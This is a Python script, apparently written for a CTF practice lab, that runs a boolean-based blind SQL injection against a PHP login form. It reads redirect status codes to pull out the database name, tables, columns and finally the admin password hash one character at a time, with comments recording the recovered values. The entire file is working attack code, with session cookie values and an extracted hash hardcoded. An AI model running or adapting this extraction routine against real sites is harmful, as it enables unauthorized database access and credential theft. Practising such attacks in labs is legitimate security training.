import sys, requests, urllib.parse, string

printable = string.printable
url = 'https://labs.matesctf.org/lab/sqli/1/index.php?page=login'
#payload = "' or 1=1#"; #302 -> redirect to index.php
#payload = "' or 1=2#"; #200 -> view password not match

#print(payload)
myheaders = {
    'Content-Type': 'application/x-www-form-urlencoded',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Encoding':'gzip, deflate'
}
#mydata = {'username': payload,'password': ''}
mycookies = {"__cfduid": "df13ec5c65ea1fbb99c1d4db9854e64b91613617028", "PHPSESSID":"e42706785378ea73501482256b8eb432"}
#print(r"' or 1=1#");
#x = requests.post(url, data = mydata, cookies = mycookies, headers = myheaders, allow_redirects=False)
#print(x.status_code)
#f = open(r"C:\Users\AnhNH\Desktop\test2.html","w+", encoding="utf-8")
#f.write(x.text)
#f.close()

#print(x.text);


def getString(query, length):
	
	result = ''
	#query = "' or substring((select database()),"
	#length = 6
    # 1 to 6
	for k in range(1,length+1):
		# Ansii character 32 to 126
		
		#for i in range(32,127):
		for i in printable:
			#key = chr(i)
			key = urllib.parse.quote(i)
			payload = query + str(k) + ",1)='" + key + "'#"
			mydata = {'username': payload,'password': ''}
			x = requests.post(url, data = mydata, cookies = mycookies, headers = myheaders, allow_redirects=False)
			print(payload)
			print(x.status_code)
			if (x.status_code == 302):
				#print(key)
				result=result+key
				break
		
	#print(result)
	return result
	

def getLength(query):
	#query = "' or length((select database()))="
	# 1 to 100
	for i in range(1,101):	
		#print(key)
		payload = query + str(i) + "#"
		mydata = {'username': payload,'password': ''}
		x = requests.post(url, data = mydata, cookies = mycookies, headers = myheaders, allow_redirects=False)
		print(payload)
		print(x.status_code)
		if (x.status_code == 302):
			break
		#print(x.status_code)
	return i # -> 6

####### Get Length Table Schema ################################### -> 6
#' or length((select database()))=1# 	                                                                
#queryLengthTableSchema = "' or length((select database()))="	
#LengthTableSchema = getLength(queryLengthTableSchema)
#print("LengthTableSchema: ", LengthTableSchema)
###################################################################
####### Get Table Schema ########################################## -> vstore
#' or substring((select database()),1,1)='a'#                                                           
#query = "' or substring((select database()),"
#TableSchemaName = getString(query, 6)
#print("TableSchemaName: ", TableSchemaName)
###################################################################
####### Get COUNT Table ########################################### -> 3
#' or abs((SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database()))=1#              
#query = "' or abs((SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_SCHEMA=database()))="
#CountTable = getLength(query)
#print("CountTable: ", CountTable)
#########################################################################
####### Get LengthTable ################################################# -> length=22
#' or length((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()))=1#           
#query = "' or length((SELECT GROUP_CONCAT(table_name SEPARATOR '-') FROM information_schema.tables WHERE TABLE_SCHEMA=database()))="
#LengthTable = getLength(query)
#print("LengthTable: ", LengthTable)
#########################################################################
####### Get Table ####################################################### -> items-users-user_items
#' or substring((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()),1,1)='a'#  
#query = "' or substring((SELECT GROUP_CONCAT(table_name SEPARATOR '-') FROM information_schema.tables WHERE TABLE_SCHEMA=database()),"
#TableName = getString(query, 22)
#print("TableName: ", TableName)
#########################################################################
####### Get Length Column ############################################### -> 42
#length((SELECT GROUP_CONCAT(column_name SEPARATOR '-') FROM information_schema.columns WHERE TABLE_SCHEMA=database() and table_name='users'))=1
#query = "' or length((SELECT GROUP_CONCAT(column_name SEPARATOR '-') FROM information_schema.columns WHERE TABLE_SCHEMA=database() and table_name='users'))="
#LengthCol = getLength(query)
#print("LengthCol: ", LengthCol)
####### Get Column####################################################### -> id-username-name-email-password-role-money
#' or substring((SELECT GROUP_CONCAT(column_name SEPARATOR '-') FROM information_schema.columns WHERE TABLE_SCHEMA=database() and table_name='users'),1,1)='a'#
#query = "' or substring((SELECT GROUP_CONCAT(column_name SEPARATOR '-') FROM information_schema.columns WHERE TABLE_SCHEMA=database() and table_name='users'),"
#ColName = getString(query, 42)
#print("ColName: ", ColName)
#########################################################################
####### Get Data ######################################################## 10 user-admin
#query = "' or length((SELECT GROUP_CONCAT(DISTINCT(role) SEPARATOR '-') FROM users))="
#LengthRole = getLength(query)
#print("LengthRole: ", LengthRole)
#query = "' or substring((SELECT GROUP_CONCAT(DISTINCT(role) SEPARATOR '-') FROM users),"
#DataName = getString(query, 10)
#print("ColName: ", DataName)
######################################################################## password 40 7c86d7f716baa9ff41e16dbc6b4e144acc5dcaec
query = "' or length((SELECT GROUP_CONCAT(password) FROM users WHERE role='admin'))="
LengthPass = getLength(query)
print("LengthPass: ", LengthPass)
query = "' or substring((SELECT GROUP_CONCAT(password) FROM users WHERE role='admin'),"
Flag = getString(query, LengthPass)
print("ColName: ", Flag)


